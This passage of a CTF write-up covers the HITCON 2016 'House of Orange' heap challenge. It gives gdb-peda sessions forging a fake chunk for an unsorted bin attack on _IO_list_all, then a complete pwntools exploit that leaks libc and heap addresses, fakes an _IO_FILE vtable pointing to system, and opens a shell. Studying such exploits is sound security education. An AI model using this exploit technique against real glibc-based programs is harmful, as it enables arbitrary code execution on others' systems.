AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Breakpoint 4, 0x000055555555511e in ?? ()
gdb-peda$ x/8gx 0x5555557580d0 + 1040
0x5555557584e0:	0x4141414141414141	0x4141414141414141
0x5555557584f0:	0x4242424242424242	0x4242424242424242
0x555555758500:	0x4242424242424242	0x4242424242424242
0x555555758510:	0x0000000000000000	0x0000000000000000
gdb-peda$
```

* **Change the value of the area using the input value as shown below.**
  + freechunk→prev\_size = "/bin/sh"
  + freechunk→size = 0x61
  + freechunk → fd = “random value”
  + freechunk→bk = "\_IO\_list\_all" address - 0x10

```sh title="Set the Fake chunk"  
Breakpoint 4, 0x000055555555511e in ?? ()
gdb-peda$ set *0x5555557584f0 = 0x6E69622F
gdb-peda$ set *0x5555557584f4 = 0x0068732F
gdb-peda$ set *0x5555557584f8 = 0x61
gdb-peda$ set *0x5555557584fc = 0x0

gdb-peda$ p &_IO_list_all
$1 = (struct _IO_FILE_plus **) 0x7ffff7dd2520 <_IO_list_all>
gdb-peda$ p/x 0x7ffff7dd2520 - 0x10
$2 = 0x7ffff7dd2510
gdb-peda$ x/4gx 0x7ffff7dd2510
0x7ffff7dd2510:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd2540	0x0000000000000000
gdb-peda$ set *0x555555758508 = 0xf7dd2510
gdb-peda$ set *0x55555575850c = 0x7fff
gdb-peda$ set *0x555555758500 = 0xAAAA
gdb-peda$ set *0x555555758504 = 0x0
gdb-peda$ x/8gx 0x5555557580d0 + 1040
0x5555557584e0:	0x4141414141414141	0x4141414141414141
0x5555557584f0:	0x0068732f6e69622f	0x0000000000000061
0x555555758500:	0x000000000000aaaa	0x00007ffff7dd2510
0x555555758510:	0x000000000000000a	0x0000000000000000
gdb-peda$
```

* When you run the "Build the house" function as follows, the value of "\_IO\_list\_all" will be changed by the changed Unsorted chunk. (Unsorted bin attack)
  + The value stored in "\_IO\_list\_all" is the address value of the main\_arena.top area.
  + An error is displayed, but the shell can be obtained by exploiting the vulnerability.

```sh title="Unsorted bin attack"
gdb-peda$ c
Continuing.
Price of Orange: 700
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange: 7
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1
*** Error in `/home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange': malloc(): memory corruption: 0x00007ffff7dd2520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff7a847e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7ffff7a8f13e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7ffff7a91184]
/home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange(+0xd6d)[0x555555554d6d]
/home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange(+0x1402)[0x555555555402]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
/home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange(+0xb19)[0x555555554b19]
======= Memory map: ========
555555554000-555555557000 r-xp 00000000 08:01 139888                     /home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange
555555756000-555555757000 r--p 00002000 08:01 139888                     /home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange
555555757000-555555758000 rw-p 00003000 08:01 139888                     /home/lazenca0x0/CTF/HITCON/houseoforange/houseoforange
555555758000-55555579b000 rw-p 00000000 00:00 0                          [heap]
7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 
7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 
7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 660756                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 660756                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 660756                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 655589                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 655589                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 655589                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 655589                     /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 655548                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fd5000-7ffff7fd8000 rw-p 00000000 00:00 0 
7ffff7ff5000-7ffff7ff8000 rw-p 00000000 00:00 0 
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 655548                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 655548                     /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

Program received signal SIGABRT, Aborted.
Stopped reason: SIGABRT
0x00007ffff7a42428 in __GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:54
54	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
gdb-peda$ x/4gx 0x7ffff7dd2510
0x7ffff7dd2510:	0x0000000000000000	0x0000000000000000
0x7ffff7dd2520 <_IO_list_all>:	0x00007ffff7dd1b78	0x0000000000000000
gdb-peda$ p &main_arena.top
$14 = (mchunkptr *) 0x7ffff7dd1b78 <main_arena+88>
gdb-peda$ 
gdb-peda$ x/gx 0x00007ffff7dd1b78
0x7ffff7dd1b78 <main_arena+88>:	0x000055555577a010
gdb-peda$
```

* **For a detailed explanation of HouseOfOrange, please refer to the pages below**

:::note[Page]
[House of Orange[Korean]](/technote/02.technote/06.heap-exploitati-882/02.heap-exploitation/house-of-orange)
:::

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

p = process('./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def Build(len,name):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Length of name :')
    p.sendline(str(len))
    p.recvuntil('Name :')
    p.sendline(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(100))
    p.recvuntil('Color of Orange:')
    p.sendline(str(1))

def See():
    p.recvuntil('Your choice : ')
    p.sendline('2')
    tmp = p.recvuntil('Price')
    data = (tmp.split('\n')[1]).ljust(8,'\x00')	
    return data

def Upgrade(len,name):
    p.recvuntil('Your choice : ')
    p.sendline('3')
    p.recvuntil('Length of name :')
    p.sendline(str(len))
    p.recvuntil('Name:')
    p.sendline(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(200))
    p.recvuntil('Color of Orange:')
    p.sendline(str(2))

Build(128,'HEAP')

#Change top size
payload = 'A' * 144
payload += p32(0xDEAD) + p32(0x20) + p64(0)
payload += p64(0) + p64(0xf31)
Upgrade(177,payload)

Build(4096,"HEAP")

#Leak Libc Addresss
Build(1024,"LEAKADD")
leakLibcAddr = u64(See())
libcAddrBase = leakLibcAddr - 0x3c5188
log.info('Leak Libc Addr : ' + hex(leakLibcAddr))
log.info('Leak Liba Addr Base : ' + hex(libcAddrBase))

#Leak Heap Addresss
Upgrade(1024,'B'*15)
leakHeapAddr = u64(See())
leakHeapAddr -= 0x130
log.info('Leak Heap Addr : ' + hex(leakHeapAddr))

#Payload Info
io_list_all = libcAddrBase + libc.symbols['_IO_list_all']
system = libcAddrBase + libc.symbols['system']
vtable = leakHeapAddr + 0x658
 
log.info('io_list_all : ' + hex(io_list_all))
log.info('system : ' + hex(system))
log.info('vtable : ' + hex(vtable))

payload = "C" * 1056

#Write to "Fake struct _IO_FILE_plus", " Fake struct _IO_wide_data"
stream = "/bin/sh\x00" + p64(0x61)
stream += p64(0xddaa) + p64(io_list_all-0x10)
stream = stream.ljust(0xa0,"\x00")
stream += p64(leakHeapAddr+0x700-0xd0)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)

payload += stream
payload += p64(0)*2
payload += p64(vtable)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(0)*3
payload += p64(system)

Upgrade(2048,payload)

p.recvuntil(":")
p.sendline("1")
 
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | hitcon&#123;Y0ur\_4r3\_the\_g0d\_of\_h34p\_4nd\_Or4ng3\_is\_s0\_4ngry&#125; |

## **Related Site**

* <http://4ngelboy.blogspot.jp/2016/10/hitcon-ctf-qual-2016-house-of-orange.html>